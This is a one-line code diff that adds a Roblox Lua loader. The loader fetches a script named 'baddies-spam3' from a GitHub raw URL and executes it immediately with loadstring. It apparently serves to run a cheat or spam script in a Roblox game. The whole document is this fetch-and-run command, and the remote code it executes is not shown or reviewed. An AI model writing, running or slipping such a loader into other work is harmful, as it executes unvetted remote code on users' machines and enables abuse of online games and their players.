@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/baddies-spam3-f9lziy4shyaa3g.lua"))()
